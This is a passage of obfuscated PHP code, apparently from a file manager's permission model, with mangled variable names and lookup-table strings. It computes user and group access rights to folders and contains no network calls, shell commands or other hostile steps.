foreach ($ÈÃ’­[$ÜÃû±¼[2086]] as $ú´¤´ÊÂ) { $ ŠßÀëø = Model($ÜÃû±¼[554])->getInfo($ú´¤´ÊÂ[$ÜÃû±¼[1899]]); $ÔÅ†æŠÖ = Model($ÜÃû±¼[567])->getInfoSimpleOuter($ºæıÖç); $ÔÅ†æŠÖ[$ÜÃû±¼[508]] = $ú´¤´ÊÂ[$ÜÃû±¼[455]]; if (Model($ÜÃû±¼[540])->authCheckAction($ú´¤´ÊÂ[$ÜÃû±¼[455]][$ÜÃû±¼[455]], $ÜÃû±¼[1920])) { continue; } $†‘§çŸÉ = array($ÜÃû±¼[32] => $ÜÃû±¼[1261] . $ ŠßÀëø[$ÜÃû±¼[32]], $ÜÃû±¼[181] => $ ŠßÀëø[$ÜÃû±¼[87]][$ÜÃû±¼[181]], $ÜÃû±¼[84] => KodIO::make($ ŠßÀëø[$ÜÃû±¼[87]][$ÜÃû±¼[181]]), $ÜÃû±¼[180] => $ÜÃû±¼[212], $ÜÃû±¼[178] => $ÜÃû±¼[547], $ÜÃû±¼[33] => $ÜÃû±¼[584], $ÜÃû±¼[551] => $ ŠßÀëø[$ÜÃû±¼[558]], $ÜÃû±¼[1899] => $ ŠßÀëø[$ÜÃû±¼[1899]], $ÜÃû±¼[555] => $ ŠßÀëø[$ÜÃû±¼[180]], $ÜÃû±¼[2083] => array($ÔÅ†æŠÖ)); $À¯ÌŸ–†[$†‘§çŸÉ[$ÜÃû±¼[181]]] = $†‘§çŸÉ; } } $‘´ÍŠÅ– = array(); $ÓĞú½íÃ = $this->getAllChildren($°±í·Â‘); foreach ($ÓĞú½íÃ as $ñŞà¢¥ä) { $à°ë«Ğ = !1; foreach ($ñŞà¢¥ä[$ÜÃû±¼[2083]] as $ÌÌ‘„üŒ) { if ($ÌÌ‘„üŒ[$ÜÃû±¼[1701]]) { if ($ÌÌ‘„üŒ[$ÜÃû±¼[1701]] == $ºæıÖç) { $à°ë«Ğ = !0; break; } } if ($ÌÌ‘„üŒ[$ÜÃû±¼[1899]]) { if ($this->groupContainUser($ÌÌ‘„üŒ[$ÜÃû±¼[1899]], $ºæıÖç)) { $à°ë«Ğ = !0; break; } } } if ($à°ë«Ğ) { $‘´ÍŠÅ–[] = $ñŞà¢¥ä; } $µ¹”Ó«” = $ñŞà¢¥ä[$ÜÃû±¼[181]]; if (isset($À¯ÌŸ–†[$µ¹”Ó«”])) { $ñŞà¢¥ä[$ÜÃû±¼[2083]][] = $À¯ÌŸ–†[$µ¹”Ó«”][0]; $À¯ÌŸ–†[$µ¹”Ó«”] = !1; } } $À¯ÌŸ–† = array_filter(array_values($À¯ÌŸ–†)); $‘´ÍŠÅ– = array_merge($À¯ÌŸ–†, $‘´ÍŠÅ–); return $‘´ÍŠÅ–; } public function setAllChildrenByUser($×€¾×œ”, $„¥±Ó, $­‘²­ÉË) { $÷³‰íÎÁ =& $_SERVER[çâ¥×ø³]; $îÁ×¦ï¾ = $this->getAllChildrenByUser($×€¾×œ”, $„¥±Ó); if (!$­‘²­ÉË || !$îÁ×¦ï¾) { return !1; } foreach ($îÁ×¦ï¾ as $á»‰ÓÂä) { $Â³Àê¸ó = array(); foreach ($á»‰ÓÂä[$÷³‰íÎÁ[2083]] as $®ƒ¤‚ìá) { $™Äì“Ù = $®ƒ¤‚ìá[$÷³‰íÎÁ[508]]; $ĞúÅ„ = $®ƒ¤‚ìá[$÷³‰íÎÁ[1701]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¦äïØúÚ = $®ƒ¤‚ìá[$÷³‰íÎÁ[1701]] ? $®ƒ¤‚ìá[$÷³‰íÎÁ[1701]] : $®ƒ¤‚ìá[$÷³‰íÎÁ[1899]]; if ($®ƒ¤‚ìá[$÷³‰íÎÁ[1701]] && $®ƒ¤‚ìá[$÷³‰íÎÁ[1701]] == $„¥±Ó) { continue; } $Â³Àê¸ó[] = array($÷³‰íÎÁ[181] => $á»‰ÓÂä[$÷³‰íÎÁ[181]], $÷³‰íÎÁ[178] => $ĞúÅ„, $÷³‰íÎÁ[538] => intval($¦äïØúÚ), $÷³‰íÎÁ[2003] => isset($™Äì“Ù[$÷³‰íÎÁ[443]]) ? intval($™Äì“Ù[$÷³‰íÎÁ[443]]) : 0, $÷³‰íÎÁ[2063] => isset($™Äì“Ù[$÷³‰íÎÁ[2063]]) ? intval($™Äì“Ù[$÷³‰íÎÁ[2063]]) : -1); } $Â³Àê¸ó[] = array($÷³‰íÎÁ[181] => $á»‰ÓÂä[$÷³‰íÎÁ[181]], $÷³‰íÎÁ[178] => SourceModel::TYPE_USER, $÷³‰íÎÁ[538] => intval($„¥±Ó), $÷³‰íÎÁ[2003] => intval($­‘²­ÉË), $÷³‰íÎÁ[2063] => -1); $this->where(array($÷³‰íÎÁ[459] => $á»‰ÓÂä[$÷³‰íÎÁ[181]]))->delete(); $this->addAll($Â³Àê¸ó); } return !0; } public function get($óÌóİéÙ) { $½‡íıÏ• = $this->getSourceList(array($óÌóİéÙ), !0); return $½‡íıÏ•[0]; } public function getSourceList($ÇÌ¦è¯, $İ¬†ëĞ = false, $¼İ€Îö½ = false) { $şú¢ú¦Å =& $_SERVER[çâ¥×ø³]; if (!$ÇÌ¦è¯) { return array(); } $ñØ‡öï… = Model($şú¢ú¦Å[1385]); if (!$İ¬†ëĞ && count($ÇÌ¦è¯) == 1) { $İ¬†ëĞ = array(); $İ¬†ëĞ[$ÇÌ¦è¯[0]] = $ñØ‡öï…->sourceInfo($ÇÌ¦è¯[0]); } if (!$İ¬†ëĞ) { $ƒÍ‰½ò€ = array($şú¢ú¦Å[459] => array($şú¢ú¦Å[460], $ÇÌ¦è¯)); $İ¬†ëĞ = $ñØ‡öï…->field($şú¢ú¦Å[2087])->where($ƒÍ‰½ò€)->select(); $İ¬†ëĞ = array_to_keyvalue($İ¬†ëĞ, $şú¢ú¦Å[181]); } $ìü’‚ = $ÇÌ¦è¯; foreach ($İ¬†ëĞ as $ì¼ÇñÑ => $Ì¯Ş·øÃ) { $ß­®›¬Í = $ñØ‡öï…->parentLevelArray($Ì¯Ş·øÃ[$şú¢ú¦Å[553]]); $ìü’‚ = array_merge($ìü’‚, array($ì¼ÇñÑ), array_reverse($ß­®›¬Í)); } $ìü’‚ = array_values(array_unique($ìü’‚)); if (!$ìü’‚) { return array(); } $ğí÷ÌÚæ = $this->sourceAuthSelect($ìü’‚); $£×ÅÃú = array(); foreach ($ìü’‚ as $–Ò›õó‰) { if (isset($ğí÷ÌÚæ[$–Ò›õó‰])) { $£×ÅÃú[$–Ò›õó‰] = $ğí÷ÌÚæ[$–Ò›õó‰]; } } $¦’õ¿ = $this->userIsRoot($¼İ€Îö½); $Ğ×§ûà = AuthModel::authAll(); $®Ñ¾á‡â = array($şú¢ú¦Å[456] => $Ğ×§ûà, $şú¢ú¦Å[2088] => array($şú¢ú¦Å[461] => 0, $şú¢ú¦Å[1905] => $Ğ×§ûà, $şú¢ú¦Å[462] => LNG($şú¢ú¦Å[2089]), $şú¢ú¦Å[1922] => $şú¢ú¦Å[2090])); $ûÙò‚—– = array(); foreach ($İ¬†ëĞ as $–Ò›õó‰ => $èç’‡Ù‰) { if ($¦’õ¿ && $GLOBALS[$şú¢ú¦Å[6]][$şú¢ú¦Å[1918]]) { $ûÙò‚—–[$–Ò›õó‰] = $®Ñ¾á‡â; continue; } $ûÙò‚—–[$–Ò›õó‰] = $this->makeSourceAuth($èç’‡Ù‰, $£×ÅÃú, $¼İ€Îö½); } return $ûÙò‚—–; } public function authDeepCheck($Ù†õøùô, $È˜øßÆä = false) { $ŸËŸªÚó =& $_SERVER[çâ¥×ø³]; $È˜øßÆä = $È˜øßÆä ? $È˜øßÆä : USER_ID; $™•ÁâßÀ = $this->makeAuthDeep($È˜øßÆä); if (!in_array($Ù†õøùô, $™•ÁâßÀ[$ŸËŸªÚó[2091]])) { return !1; } $¬ƒç¡˜ = array(); foreach ($™•ÁâßÀ[$ŸËŸªÚó[2092]] as $¢¼ïË‘ => $”„ò÷á‹) { if (!in_array($Ù†õøùô, $”„ò÷á‹)) { continue; } $¬ƒç¡˜[] = $¢¼ïË‘; } if (!$¬ƒç¡˜) { return !1; } $“³¢¿§ = $¬ƒç¡˜ ? $¬ƒç¡˜[0] : $Ù†õøùô; return array($ŸËŸªÚó[456] => -1, $ŸËŸªÚó[508] => array($ŸËŸªÚó[461] => $ŸËŸªÚó[1241], $ŸËŸªÚó[1905] => $ŸËŸªÚó[212], $ŸËŸªÚó[462] => LNG($ŸËŸªÚó[2093]), $ŸËŸªÚó[1922] => $ŸËŸªÚó[2094]), $ŸËŸªÚó[2095] => LNG($ŸËŸªÚó[2096]), $ŸËŸªÚó[2097] => $this->sourceAuthInfo($“³¢¿§)); } protected function makeAuthDeep($û»óŸäÛ = false) { $Ò‘¶ÎË‚ =& $_SERVER[çâ¥×ø³]; static $ìÜñ’œê = array(); $û»óŸäÛ = $û»óŸäÛ ? $û»óŸäÛ : USER_ID; if (isset($ìÜñ’œê[$û»óŸäÛ])) { return $ìÜñ’œê[$û»óŸäÛ]; } $Ã„ñÈşÉ = Model($Ò‘¶ÎË‚[2098])->listData(); $ÓÙ÷½’ò = array(); foreach ($Ã„ñÈşÉ as $ğô×ŸÄª) { if ($ğô×ŸÄª[$Ò‘¶ÎË‚[455]] == 0 && $ğô×ŸÄª[$Ò‘¶ÎË‚[1921]] == $Ò‘¶ÎË‚[88]) { $ÓÙ÷½’ò[] = $ğô×ŸÄª[$Ò‘¶ÎË‚[443]]; } } $œ—±ñäÜ = $this->userGroupParents($û»óŸäÛ); $ŠßÖİé± = array($Ò‘¶ÎË‚[178] => SourceModel::TYPE_USER, $Ò‘¶ÎË‚[538] => $û»óŸäÛ); if ($œ—±ñäÜ) { $ŠßÖİé± = array(array($Ò‘¶ÎË‚[178] => SourceModel::TYPE_USER, $Ò‘¶ÎË‚[538] => $û»óŸäÛ), array($Ò‘¶ÎË‚[178] => SourceModel::TYPE_GROUP, $Ò‘¶ÎË‚[538] => array($Ò‘¶ÎË‚[460], $œ—±ñäÜ)), $Ò‘¶ÎË‚[1053] => $Ò‘¶ÎË‚[1997]); } $“Ø‘»˜é = $this->field($Ò‘¶ÎË‚[2099])->where($ŠßÖİé±)->select(); $Úø¢ûÈş = array(); $¼º¿‰ó³ = array_to_keyvalue_group($“Ø‘»˜é, $Ò‘¶ÎË‚[181]); foreach ($¼º¿‰ó³ as $¸Û—ÀÃÏ => $£ƒç…Ğ) { $–âóøÎê = $this->authArrayCheck($£ƒç…Ğ, $û»óŸäÛ); if ($–âóøÎê[$Ò‘¶ÎË‚[456]] > 0) { $Úø¢ûÈş[] = $¸Û—ÀÃÏ . $Ò‘¶ÎË‚[12]; } } if ($œ—±ñäÜ) { $»Ëë‚–¾ = Model($Ò‘¶ÎË‚[554]); foreach ($œ—±ñäÜ as $°Ä“µÛÅ) { $Ÿ±œéü´ = $»Ëë‚–¾->getInfo($°Ä“µÛÅ); if (!$Ÿ±œéü´ || !is_array($Ÿ±œéü´[$Ò‘¶ÎË‚[87]])) { continue; } $Úø¢ûÈş[] = $Ÿ±œéü´[$Ò‘¶ÎË‚[87]][$Ò‘¶ÎË‚[181]]; } } $¸ï¶‘óŸ = array(); $¬‹‚ÌÎï = $œ—±ñäÜ; $±¤³±Ö° = Model($Ò‘¶ÎË‚[1385]); $»Ëë‚–¾ = Model($Ò‘¶ÎË‚[554]); $µïØ¡ù© = array(); $°Åù©Ü = array(); $ªÏ³Û´® = array(); $Ë©É‹½ = array(); if ($Úø¢ûÈş) { $ ÅÒíŠû = $±¤³±Ö°->where(array($Ò‘¶ÎË‚[181] => array($Ò‘¶ÎË‚[460], $Úø¢ûÈş)))->select(); foreach ($ ÅÒíŠû as $ÉÆï†¾‚) { $ù¡‰çÓ¥ = $±¤³±Ö°->parentLevelArray($ÉÆï†¾‚[$Ò‘¶ÎË‚[553]]); $¸ï¶‘óŸ = array_merge($¸ï¶‘óŸ, $ù¡‰çÓ¥); $¬‹‚ÌÎï[] = $ÉÆï†¾‚[$Ò‘¶ÎË‚[538]]; $µïØ¡ù©[$ÉÆï†¾‚[$Ò‘¶ÎË‚[181]]] = $ù¡‰çÓ¥; $°Åù©Ü[$ÉÆï†¾‚[$Ò‘¶ÎË‚[181]]] = $ÉÆï†¾‚[$Ò‘¶ÎË‚[538]]; } } $¬‹‚ÌÎï = array_values(array_unique($¬‹‚ÌÎï)); $¶ÙœÍï = $¬‹‚ÌÎï; foreach ($¶ÙœÍï as $°Ä“µÛÅ) { $Ÿ±œéü´ = $»Ëë‚–¾->getInfo($°Ä“µÛÅ); $ù¡‰çÓ¥ = $±¤³±Ö°->parentLevelArray($Ÿ±œéü´[$Ò‘¶ÎË‚[553]]); $¬‹‚ÌÎï = array_merge($¬‹‚ÌÎï, $ù¡‰çÓ¥); } $¬‹‚ÌÎï = array_values(array_unique($¬‹‚ÌÎï)); foreach ($¬‹‚ÌÎï as $°Ä“µÛÅ) { $Ÿ±œéü´ = $»Ëë‚–¾->getInfo($°Ä“µÛÅ); $¸ï¶‘óŸ[] = $Ÿ±œéü´[$Ò‘¶ÎË‚[87]][$Ò‘¶ÎË‚[181]]; $ªÏ³Û´®[$°Ä“µÛÅ] = $Ÿ±œéü´[$Ò‘¶ÎË‚[87]][$Ò‘¶ÎË‚[181]]; $Ë©É‹½[$°Ä“µÛÅ] = $±¤³±Ö°->parentLevelArray($Ÿ±œéü´[$Ò‘¶ÎË‚[553]]); } foreach ($µïØ¡ù© as $™ø†¸ => $¨ê£´¢) { $ìÁˆ¹Ú® = $°Åù©Ü[$™ø†¸]; if (!$ìÁˆ¹Ú® || !$ªÏ³Û´®[$ìÁˆ¹Ú®]) { continue; } $‹ä¶ˆÂ¡ = array(); foreach ($Ë©É‹½[$ìÁˆ¹Ú®] as $°Ä“µÛÅ) { $‹ä¶ˆÂ¡[] = $ªÏ³Û´®[$°Ä“µÛÅ]; } $µïØ¡ù©[$™ø†¸] = array_merge($‹ä¶ˆÂ¡, $¨ê£´¢); } $¸ï¶‘óŸ = array_values(array_unique($¸ï¶‘óŸ)); $Ş§ë»µ‘ = array($Ò‘¶ÎË‚[2091] => $¸ï¶‘óŸ, $Ò‘¶ÎË‚[2092] => $µïØ¡ù©); $ìÜñ’œê[$û»óŸäÛ] = $Ş§ë»µ‘; return $Ş§ë»µ‘; } private function makeSourceAuth($ÊÇÈîŸĞ, $Æ’–ƒÑ„, $‚–Ù­å = false) { $„–¥â¦ =& $_SERVER[çâ¥×ø³]; $†à²õÄ = $„–¥â¦[88]; $Ş¼ãåî = $ÊÇÈîŸĞ[$„–¥â¦[538]]; $¿¸„êåŞ = $ÊÇÈîŸĞ[$„–¥â¦[178]] == SourceModel::TYPE_GROUP; $÷‚ÎËÃ = $¿¸„êåŞ ? $this->groupRootAuth($Ş¼ãåî, $‚–Ù­å) : !1; if ($÷‚ÎËÃ && Model($„–¥â¦[540])->authCheckAction($÷‚ÎËÃ[$„–¥â¦[455]], $„–¥â¦[1920])) { return $this->groupAuthInfo($÷‚ÎËÃ, $Ş¼ãåî); } $¯¶ß©È = Model($„–¥â¦[1385])->parentLevelArray($ÊÇÈîŸĞ[$„–¥â¦[553]]); $¯¶ß©È = array_merge(array($ÊÇÈîŸĞ[$„–¥â¦[181]]), array_reverse($¯¶ß©È)); $ÎûË°©Ç = !1; foreach ($¯¶ß©È as $ñï´®´) { if (!isset($Æ’–ƒÑ„[$ñï´®´])) { continue; } $´ïı”— = $this->authMake($Æ’–ƒÑ„[$ñï´®´], $‚–Ù­å); if ($´ïı”—[$„–¥â¦[508]]) { $ÎûË°©Ç = $´ïı”—; break; } } if (!$¿¸„êåŞ) { return $ÎûË°©Ç; } if (!$ÎûË°©Ç && $÷‚ÎËÃ) { $ÎûË°©Ç = $this->groupAuthInfo($÷‚ÎËÃ, $Ş¼ãåî); } if (!$ÎûË°©Ç) { $ÊıëÖ”ú = Model($„–¥â¦[554])->getInfo($Ş¼ãåî); $ÕıÃ¬°ˆ = explode($„–¥â¦[50], trim($ÊıëÖ”ú[$„–¥â¦[553]], $„–¥â¦[50])); $ÕıÃ¬°ˆ = array_reverse($ÕıÃ¬°ˆ); foreach ($ÕıÃ¬°ˆ as $×ıİüİİ) { if ($×ıİüİİ == $„–¥â¦[212] || $×ıİüİİ == $†à²õÄ) { continue; } $àåÉáæ = $this->groupRootAuth($×ıİüİİ, $‚–Ù­å); if (!$àåÉáæ) { continue; } $ÎûË°©Ç = $this->groupAuthInfo($àåÉáæ, $×ıİüİİ); break; } } if (!$ÎûË°©Ç || $ÎûË°©Ç[$„–¥â¦[456]] <= 0) { $±Òæ÷ê = $this->authDeepCheck($ÊÇÈîŸĞ[$„–¥â¦[181]], $‚–Ù­å); if ($±Òæ÷ê) { $ÎûË°©Ç = $±Òæ÷ê; } } return $ÎûË°©Ç; } private function userIsRoot($¤—ñóú = false) { $ûøò„¸ =& $_SERVER[çâ¥×ø³]; if (!$¤—ñóú && _get($GLOBALS, $ûøò„¸[536])) { return !0; } $¸‘ğÚõ = Model($ûøò„¸[567])->getInfo($¤—ñóú); $¨’Ğ€ëš = Model($ûøò„¸[2100])->listData($¸‘ğÚõ[$ûøò„¸[1576]]); if ($¨’Ğ€ëš && $¨’Ğ€ëš[$ûøò„¸[544]][$ûøò„¸[2101]] == 1) { return !0; } return !1; } private function sourceAuthInfo($İéÍ…ºë) { $Úªõî™ò =& $_SERVER[çâ¥×ø³]; $ÖË°ßÙ = Model($Úªõî™ò[1385]); $×±¸Õ° = $ÖË°ßÙ->sourceInfo($İéÍ…ºë); if (!$×±¸Õ°) { return !1; } $ÖË°ßÙ->groupPathDisplay($×±¸Õ°); $›ÑÑ„Ã÷ = array($×±¸Õ°); $›ÑÑ„Ã÷ = $ÖË°ßÙ->_listAppendPath($›ÑÑ„Ã÷); $×±¸Õ° = $›ÑÑ„Ã÷[0]; $©÷¬­÷À = $×±¸Õ°[$Úªõî™ò[551]]; if (isset($×±¸Õ°[$Úªõî™ò[559]])) { $úôßô¸Ò = explode($Úªõî™ò[8], trim($×±¸Õ°[$Úªõî™ò[551]], $Úªõî™ò[8])); array_shift($úôßô¸Ò); $©÷¬­÷À = $×±¸Õ°[$Úªõî™ò[557]] . $Úªõî™ò[2102] . implode($Úªõî™ò[8], $úôßô¸Ò); } return array($Úªõî™ò[462] => $×±¸Õ°[$Úªõî™ò[32]], $Úªõî™ò[84] => KodIO::make($×±¸Õ°[$Úªõî™ò[181]]), $Úªõî™ò[2103] => $©÷¬­÷À); } private function groupAuthInfo($¯øøùöÄ, $ş´’†Ş‘) { $Ÿ´ˆ…œ =& $_SERVER[çâ¥×ø³]; $¾Æäº¹š = Model($Ÿ´ˆ…œ[554])->getInfo($ş´’†Ş‘); return array($Ÿ´ˆ…œ[2104] => intval($¯øøùöÄ[$Ÿ´ˆ…œ[455]]), $Ÿ´ˆ…œ[2088] => $¯øøùöÄ, $Ÿ´ˆ…œ[2105] => LNG($Ÿ´ˆ…œ[2106]), $Ÿ´ˆ…œ[2097] => array($Ÿ´ˆ…œ[462] => $¾Æäº¹š[$Ÿ´ˆ…œ[32]], $Ÿ´ˆ…œ[84] => KodIO::make($¾Æäº¹š[$Ÿ´ˆ…œ[87]][$Ÿ´ˆ…œ[181]]), $Ÿ´ˆ…œ[2103] => $¾Æäº¹š[$Ÿ´ˆ…œ[558]])); } protected function groupRootAuth($Ÿ¾Òê‹, $­ôŞÕƒŞ = false) { $Ñöü…–Í =& $_SERVER[çâ¥×ø³]; $­ôŞÕƒŞ = $­ôŞÕƒŞ ? $­ôŞÕƒŞ : USER_ID; $Ì€¾ååŒ = $­ôŞÕƒŞ . $Ñöü…–Í[2107] . $Ÿ¾Òê‹; static $Ï¯§ôåÍ = array(); if (isset($Ï¯§ôåÍ[$Ì€¾ååŒ])) { return $Ï¯§ôåÍ[$Ì€¾ååŒ]; } $ù¡ıÁó = Model($Ñöü…–Í[554])->getInfo($Ÿ¾Òê‹); $©»‡ÜıØ = $this->userGroupList($­ôŞÕƒŞ); $Ã€ßÉÒ“ = isset($©»‡ÜıØ[$Ÿ¾Òê‹]) ? $©»‡ÜıØ[$Ÿ¾Òê‹][$Ñöü…–Í[455]] : !1; if ($Ã€ßÉÒ“ && Model($Ñöü…–Í[540])->authCheckAction($Ã€ßÉÒ“[$Ñöü…–Í[455]], $Ñöü…–Í[1920])) { $Ï¯§ôåÍ[$Ì€¾ååŒ] = $Ã€ßÉÒ“; return $Ã€ßÉÒ“; } $—½™¯Û = $this->sourceAuthSelect($ù¡ıÁó[$Ñöü…–Í[87]][$Ñöü…–Í[181]]); $çæÊæ™ = $—½™¯Û ? $this->authMake($—½™¯Û, $­ôŞÕƒŞ) : !1; $¿ÓÉğö = $çæÊæ™ ? $çæÊæ™[$Ñöü…–Í[508]] : !1; $Ï¯§ôåÍ[$Ì€¾ååŒ] = $¿ÓÉğö ? $¿ÓÉğö : $Ã€ßÉÒ“; return $Ï¯§ôåÍ[$Ì€¾ååŒ]; } public function authOwnerApply($ô¹Áã) { $Şó½×´ş =& $_SERVER[çâ¥×ø³]; if (empty($ô¹Áã[$Şó½×´ş[455]]) || isset($ô¹Áã[$Şó½×´ş[2108]]) && $ô¹Áã[$Şó½×´ş[2108]]) { return $ô¹Áã; } if (AuthModel::authCheckRoot($ô¹Áã[$Şó½×´ş[455]][$Şó½×´ş[456]])) { return $ô¹Áã; } $Õ¡÷²ÃŞ = Model($Şó½×´ş[1385])->parentLevelArray($ô¹Áã[$Şó½×´ş[553]]); $Õ¡÷²ÃŞ = array_merge(array($ô¹Áã[$Şó½×´ş[181]]), array_reverse($Õ¡÷²ÃŞ)); $³èˆéã = $this->sourceAuthSelect($Õ¡÷²ÃŞ); $¬ŒŒêü€ = array(); $ûùÒÉ² = array(); foreach ($³èˆéã as $Œ‚³ñÏ => $ø»úãôÖ) { $îµË©¡ = $this->authFolderOwnerUser($ø»úãôÖ); $¬ŒŒêü€[$Œ‚³ñÏ] = $îµË©¡; $ûùÒÉ² = array_merge($ûùÒÉ², $îµË©¡[$Şó½×´ş[630]]); if ($îµË©¡[$Şó½×´ş[2109]]) { break; } } if (count($ûùÒÉ²) == 0) { $ûùÒÉ² = $this->authFolderOwnerGroup($ô¹Áã[$Şó½×´ş[538]]); } $ûùÒÉ² = array_unique($ûùÒÉ²); if (AuthModel::authCheckRoot($ô¹Áã[$Şó½×´ş[455]][$Şó½×´ş[456]])) { $ûùÒÉ²[] = USER_ID; } $ô¹Áã[$Şó½×´ş[455]][$Şó½×´ş[2110]] = Model($Şó½×´ş[546])->userListInfo($ûùÒÉ²); return $ô¹Áã; } private function authFolderOwnerGroup($ÔÛœÉ¶å) { $Óë“”Æá =& $_SERVER[çâ¥×ø³]; $Ò˜ŒşĞ‰ = Model($Óë“”Æá[1989])->where(array($Óë“”Æá[1899] => $ÔÛœÉ¶å))->select(); $¦µù‹„ö = array(); if (!$Ò˜ŒşĞ‰) { return $¦µù‹„ö; } foreach ($Ò˜ŒşĞ‰ as $ùÁŠÑİÙ) { $º¡­Ç¨š = $this->authInfo($ùÁŠÑİÙ); if (AuthModel::authCheckRoot($º¡­Ç¨š[$Óë“”Æá[455]])) { $¦µù‹„ö[] = $ùÁŠÑİÙ[$Óë“”Æá[1701]]; } } return $¦µù‹„ö; } private function authFolderOwnerUser($Ù°è÷˜Ç) { $ù†…Ù =& $_SERVER[çâ¥×ø³]; $È¿æÌèõ = array(); $ê®Â¸¤‚ = !1; foreach ($Ù°è÷˜Ç as $«—«¢éğ) { $ü¡˜÷²« = $this->authInfo($«—«¢éğ); if ($«—«¢éğ[$ù†…Ù[538]] == $ù†…Ù[212]) { $ê®Â¸¤‚ = !0; } if ($«—«¢éğ[$ù†…Ù[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ü¡˜÷²«[$ù†…Ù[455]])) { $È¿æÌèõ[] = $«—«¢éğ[$ù†…Ù[538]]; } } } return array($ù†…Ù[630] => $È¿æÌèõ, $ù†…Ù[2109] => $ê®Â¸¤‚); } public function authMake($ª»™ºĞÊ, $Ş†•ëé = false) { $Œõ÷²¥õ =& $_SERVER[çâ¥×ø³]; $»¡Åµ­ = $this->authArrayCheck($ª»™ºĞÊ, $Ş†•ëé); if ($»¡Åµ­[$Œõ÷²¥õ[2111]]) { $»¡Åµ­[$Œõ÷²¥õ[2111]] = $this->sourceAuthInfo($»¡Åµ­[$Œõ÷²¥õ[2111]]); } return $»¡Åµ­; } public function authArrayCheck($¡®Ñöêå, $­ÂñÀëº = false) { $äàäÔ„ş =& $_SERVER[çâ¥×ø³]; if (!$¡®Ñöêå) { return array($äàäÔ„ş[456] => 0, $äàäÔ„ş[508] => !1); } $­ÂñÀëº = $­ÂñÀëº ? $­ÂñÀëº : USER_ID; $¶Š€çï = 0; $Ë·¡Ğ÷ = 0; $Éàò¸ß = 0; $¡íàî¬¤ = 0; $ë×êû« = 0; $‘¡€á£ = 0; $Ä¹‰Üº = 1000; $ğæ—¡À = 0; $ó×˜Óˆ½ = 0; $•ëãªÅŞ = 0; $øóä’Äå = 0; $ÓıÑÅÃ‘ = array($äàäÔ„ş[181] => 0); foreach ($¡®Ñöêå as $ÓıÑÅÃ‘) { $çû¤¤å± = $this->authInfo($ÓıÑÅÃ‘); if (!$çû¤¤å±) { continue; } $¯ •©Ÿë = $ÓıÑÅÃ‘[$äàäÔ„ş[538]]; $ò›©½ı = intval($çû¤¤å±[$äàäÔ„ş[455]]); if ($ÓıÑÅÃ‘[$äàäÔ„ş[178]] == SourceModel::TYPE_USER && $¯ •©Ÿë == $­ÂñÀëº) { $¶Š€çï = !0; $Éàò¸ß = $çû¤¤å±; $Ë·¡Ğ÷ = $ò›©½ı; } else { if ($ÓıÑÅÃ‘[$äàäÔ„ş[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¯ •©Ÿë, $­ÂñÀëº)) { $¡íàî¬¤ = !0; $©³³”–¿ = $this->groupStepToUserGroup($¯ •©Ÿë, $­ÂñÀëº); if ($©³³”–¿ < $Ä¹‰Üº) { $Ä¹‰Üº = $©³³”–¿; $ë×êû« = $ò›©½ı; $‘¡€á£ = $çû¤¤å±; $ğæ—¡À = $¯ •©Ÿë; } if ($©³³”–¿ == $Ä¹‰Üº && $ò›©½ı >= $ë×êû«) { $ë×êû« = $ò›©½ı; $‘¡€á£ = $çû¤¤å±; $ğæ—¡À = $¯ •©Ÿë; } } else { if ($¯ •©Ÿë == $äàäÔ„ş[212]) { $ó×˜Óˆ½ = !0; $øóä’Äå = $çû¤¤å±; $•ëãªÅŞ = $ò›©½ı; } } } } if ($¶Š€çï) { $˜¯á¥Äß = $Ë·¡Ğ÷; $çû¤¤å± = $Éàò¸ß; $Ãã§î„Î = LNG($äàäÔ„ş[2112]); } else { if ($¡íàî¬¤) { $˜¯á¥Äß = $ë×êû«; $çû¤¤å± = $‘¡€á£; $›ÃÙ´ = Model($äàäÔ„ş[554])->getInfo($ğæ—¡À); $Ãã§î„Î = $äàäÔ„ş[163] . $›ÃÙ´[$äàäÔ„ş[558]] . $äàäÔ„ş[2113] . LNG($äàäÔ„ş[2114]); } else { if ($ó×˜Óˆ½) { $˜¯á¥Äß = $•ëãªÅŞ; $çû¤¤å± = $øóä’Äå; $Ãã§î„Î = LNG($äàäÔ„ş[2085]); } else { $˜¯á¥Äß = 0; $çû¤¤å± = !1; $Ãã§î„Î = $äàäÔ„ş[12]; } } } $Ä—Âîû = array($äàäÔ„ş[2104] => intval($˜¯á¥Äß), $äàäÔ„ş[2088] => $çû¤¤å±, $äàäÔ„ş[2105] => $Ãã§î„Î, $äàäÔ„ş[2097] => $ÓıÑÅÃ‘[$äàäÔ„ş[181]]); return $Ä—Âîû; } private function groupContainUser($úÍø¹üã, $Èá¥’ß… = false) { return in_array($úÍø¹üã, $this->userGroupParents($Èá¥’ß…)); } private function groupStepToUserGroup($×ı¾Á†, $æ™Ûãƒ = false) { $òÓÚ²‚Ó =& $_SERVER[çâ¥×ø³]; $”şİÃË = $this->userGroupList($æ™Ûãƒ); $ˆóŞşş¼ = 1000; $ë…›²ó• = $GLOBALS[$òÓÚ²‚Ó[6]][$òÓÚ²‚Ó[89]][$òÓÚ²‚Ó[2002]] == 1; $ùğçò€¥ = $ë…›²ó• ? 3 : 2; foreach ($”şİÃË as $Ï•Ññ™) { if ($Ï•Ññ™[$òÓÚ²‚Ó[1899]] == $×ı¾Á†) { return 0; } $¯£¬×€Ì = explode($òÓÚ²‚Ó[50], trim($Ï•Ññ™[$òÓÚ²‚Ó[553]], $òÓÚ²‚Ó[50])); if ($¯£¬×€Ì[0] == $òÓÚ²‚Ó[212] && count($¯£¬×€Ì) > $ùğçò€¥) { $‚…äÜ¡ù = array_reverse(array_slice($¯£¬×€Ì, $ùğçò€¥)); $Ï–‹áƒ© = array_search($×ı¾Á†, $‚…äÜ¡ù); if ($Ï–‹áƒ© !== !1 && $Ï–‹áƒ© + 1 <= $ˆóŞşş¼) { $ˆóŞşş¼ = $Ï–‹áƒ© + 1; } } } return $ˆóŞşş¼; } private function userGroupList($Ø•ÚãŒ¦ = false) { $Ç‹Ô—­´ =& $_SERVER[çâ¥×ø³]; static $æ½Äù› = array(); if (isset($æ½Äù›[$Ø•ÚãŒ¦])) { return $æ½Äù›[$Ø•ÚãŒ¦]; } $ö’¹ıÎö = Model($Ç‹Ô—­´[567])->getInfo($Ø•ÚãŒ¦); $æ½Äù›[$Ø•ÚãŒ¦] = array_to_keyvalue($ö’¹ıÎö[$Ç‹Ô—­´[2086]], $Ç‹Ô—­´[1899]); return $æ½Äù›[$Ø•ÚãŒ¦]; } public function 